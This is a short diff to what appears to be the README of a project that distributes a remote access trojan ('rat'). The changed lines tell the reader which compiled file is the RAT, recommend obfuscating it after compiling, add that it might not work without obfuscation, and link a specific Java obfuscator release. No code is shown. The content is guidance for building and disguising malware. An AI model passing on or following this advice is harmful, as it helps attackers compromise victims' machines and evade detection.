@@ -19,4 +19,5 @@
 
 ### The rat is the file without "-sources" at the end.
 ### After compiling it I highly recommend obfuscating it
+### It might not work without obfuscation. 
 ### heres a good obfuscator: https://github.com/skidfuscatordev/skidfuscator-java-obfuscator/releases/tag/2.0.5-SNAPSHOT
